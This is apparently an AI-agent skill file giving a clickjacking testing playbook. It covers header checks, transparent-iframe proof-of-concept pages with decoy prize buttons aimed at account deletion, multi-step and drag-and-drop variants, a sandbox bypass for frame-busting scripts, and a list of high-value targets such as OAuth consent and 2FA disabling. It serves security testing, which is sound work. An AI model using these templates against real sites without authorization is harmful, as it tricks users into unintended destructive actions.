---
name: clickjacking
description: >-
  Clickjacking playbook. Use when testing whether target pages can be framed, whether X-Frame-Options or CSP frame-ancestors are properly configured, and whether UI redress attacks can trigger sensitive actions.
---

# SKILL: Clickjacking — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Clickjacking (UI redress) techniques. Covers iframe transparency tricks, X-Frame-Options bypass, CSP frame-ancestors, multi-step clickjacking, drag-and-drop attacks, and chaining with other vulnerabilities. Often a "low severity" finding that becomes critical when targeting admin actions.

## QUICK START

### First-pass probes

| Signal | Probe | Why |
|---|---|---|
| Sensitive action page? | List pages with state-changing actions (delete, transfer, role change) | High-value clickjacking targets |
| X-Frame-Options present? | Check response headers for XFO: DENY / SAMEORIGIN / absent | Absent or misconfigured = frameable |
| CSP frame-ancestors present? | Check for `frame-ancestors 'none'` / `'self'` / absent | Supersedes XFO in modern browsers |
| Load in iframe? | Create `<iframe src="https://target/sensitive-action">` | Page loads = frameable = vulnerable |
| Frameable? | Build transparent iframe PoC with decoy button | Confirms exploitable clickjacking |

```bash
# Quick test — check framing headers
curl -sI https://target/account/delete | grep -i "x-frame-options\|content-security-policy"
```

---

## 1. CORE CONCEPT

Clickjacking loads a target page in a transparent iframe overlaid on an attacker's page. The victim sees the attacker's UI but clicks on the invisible target page, performing unintended actions.

```html
<style>
  iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.0001; z-index: 2; }
  .decoy { position: absolute; top: 200px; left: 100px; z-index: 1; }
</style>
<div class="decoy"><button>Click to win a prize!</button></div>
<iframe src="https://target.com/account/delete?confirm=yes"></iframe>
```

---

## 2. DETECTION — IS THE PAGE FRAMEABLE?

### Check X-Frame-Options Header

```
X-Frame-Options: DENY           → cannot be framed (secure)
X-Frame-Options: SAMEORIGIN     → only same-origin framing (secure for cross-origin)
X-Frame-Options: ALLOW-FROM uri → deprecated, browser support inconsistent
(header absent)                  → frameable! (vulnerable)
```

### Check CSP frame-ancestors

```
Content-Security-Policy: frame-ancestors 'none'        → cannot be framed
Content-Security-Policy: frame-ancestors 'self'         → same-origin only
Content-Security-Policy: frame-ancestors https://a.com  → specific origin
(directive absent)                                       → frameable
```

**CSP frame-ancestors supersedes X-Frame-Options** in modern browsers.

### Quick PoC Test

```html
<iframe src="https://target.com/sensitive-action" width="800" height="600"></iframe>
```

If the page loads in the iframe → frameable → potentially vulnerable.

### JavaScript Frame Detection (from target page source)

```javascript
// Common frame-busting code found in target pages:
if (top.location.hostname !== self.location.hostname) {
    top.location.href = self.location.href;
}
```

If this code is present but not using CSP `frame-ancestors`, it can often be bypassed.

---

## 3. PROOF OF CONCEPT TEMPLATES

### Basic Single-Click

```html
<html>
<head><title>Free Prize</title></head>
<body>
<h1>Click the button to claim your prize!</h1>
<style>
  iframe { position: absolute; top: 300px; left: 60px;
           width: 500px; height: 200px; opacity: 0.0001; z-index: 2; }
</style>
<iframe src="https://target.com/account/settings?action=delete"></iframe>
</body>
</html>
```

### Multi-Step Clickjacking

For actions requiring multiple clicks (e.g., "Are you sure?" confirmation):

```html
<div id="step1">
  <button onclick="document.getElementById('step1').style.display='none';
                    document.getElementById('step2').style.display='block';">
    Step 1: Click here
  </button>
</div>
<div id="step2" style="display:none">
  <button>Step 2: Confirm</button>
</div>
<iframe src="https://target.com/admin/action"></iframe>
```

Reposition iframe for each step to align the transparent button with the decoy.

### Drag-and-Drop Clickjacking

Extract data from one iframe to another using HTML5 drag-and-drop events — the victim drags across invisible iframes, transferring tokens or data.

---

## 4. BYPASS TECHNIQUES

### Frame-Busting Script Bypass

Some pages use JavaScript frame-busting:
```javascript
if (top !== self) { top.location = self.location; }
```

**Bypass with sandbox attribute**:
```html
<iframe src="https://target.com" sandbox="allow-forms allow-scripts"></iframe>
<!-- sandbox without allow-top-navigation prevents frame-busting -->
```

### X-Frame-Options ALLOW-FROM Bypass

`ALLOW-FROM` is not supported in Chrome/Safari. If the server relies solely on `ALLOW-FROM`, modern browsers ignore it → page is frameable.

### Double-Framing

If `X-Frame-Options: SAMEORIGIN` is set, but a same-origin page exists that can be framed (without XFO), use that page as an intermediary to frame the target.

---

## 5. HIGH-IMPACT TARGETS

```text
Account deletion page
Email/password change form
Admin panel actions (add user, change role)
Payment confirmation
OAuth authorization ("Allow" button)
Two-factor authentication disable
API key generation
Webhook configuration
```

---

## DECISION TREE

```
Page has sensitive action (delete account, change email, admin)?
├── X-Frame-Options header present?
│   ├── DENY or SAMEORIGIN → cannot frame cross-origin (check CSP too)
│   └── Missing or ALLOW-FROM → frameable
├── CSP frame-ancestors directive present?
│   ├── 'none' or 'self' → cannot frame cross-origin
│   └── Missing → frameable
├── Page loads in iframe?
│   ├── No → frame-busting script detected?
│   │   ├── Yes → try sandbox="allow-forms allow-scripts" bypass
│   │   └── No → XFO/CSP blocks framing → not vulnerable
│   └── Yes → framing allowed
│       ├── Single-click action → build basic transparent iframe PoC
│       ├── Multi-step action → build multi-click PoC with repositioned iframe
│       └── Data to extract → drag-and-drop clickjacking PoC
└── Not frameable but subdomain has XSS?
    └── Use subdomain XSS as same-origin staging point
```

## TARGET TOOL ADAPTATION

Use visible `http-framework-test` to compare framing headers across endpoints. Build a minimal local iframe PoC with visible file/command tools; browser verification is optional and only applies when a browser capability is actually visible.

## TESTING CHECKLIST

```
□ Check X-Frame-Options header on sensitive pages
□ Check CSP frame-ancestors directive
□ Create iframe PoC and verify page loads
□ Test frame-busting scripts — try sandbox attribute bypass
□ Identify high-value single-click actions
□ For multi-step actions, build multi-click PoC
□ Test both authenticated and unauthenticated pages
□ Verify ALLOW-FROM behavior across browsers
```

## RELATED ROUTING

- [csrf](../csrf-cross-site-request-forgery/SKILL.md) — CSRF and clickjacking both exploit victim browser sessions
- [xss](../xss-cross-site-scripting/SKILL.md) — XSS can inject iframe content and chain with clickjacking
- [cors](../cors-cross-origin-misconfiguration/SKILL.md) — CORS misconfiguration can complement framing attacks
- [authbypass](../authbypass-authentication-flaws/SKILL.md) — Auth bypass determines which actions are exploitable
